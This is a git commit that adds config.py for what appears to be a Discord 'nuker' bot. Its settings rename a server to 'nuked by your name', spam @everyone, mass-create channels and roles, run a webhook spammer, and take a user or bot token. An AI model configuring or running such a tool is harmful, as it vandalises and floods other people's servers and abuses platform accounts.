bfb47934df1fe31561363de8405c6424407ffb50
DaredeviL MenZ <82829983+DaredeviLpg@users.noreply.github.com>
2021-10-22 15:03:55 +0700

    Create config.py

---
+++ config.py
@@ -0,0 +1,31 @@
+your_id = "your discord id here"
+token = "your bots/your token here"
+bot_status = "bot status here"
+scnames = [
+  "nuked by your name", 
+  "your name was here", 
+  "your name owns you"
+]
+rcnames = [
+  "nuked by your name", 
+  "your name was here", 
+  "your name owns you"
+]
+spam_msg = "@everyone nuked by your name !"
+guild_name = "nuked by your name !"
+guild_icon = "https://someimageurl"
+scamount = 500
+rcamount = 249
+esamount = 50
+emojiurl = "https://someimageurl"
+webhook_spammer = True
+webhook_avatars = [
+  "https://someimageurl",
+  "https://someimageurl",
+  "https://someimageurl"
+]
+webhook_names = [
+  "nuked by your name", 
+  "your name was here", 
+  "your name owns you"
+]
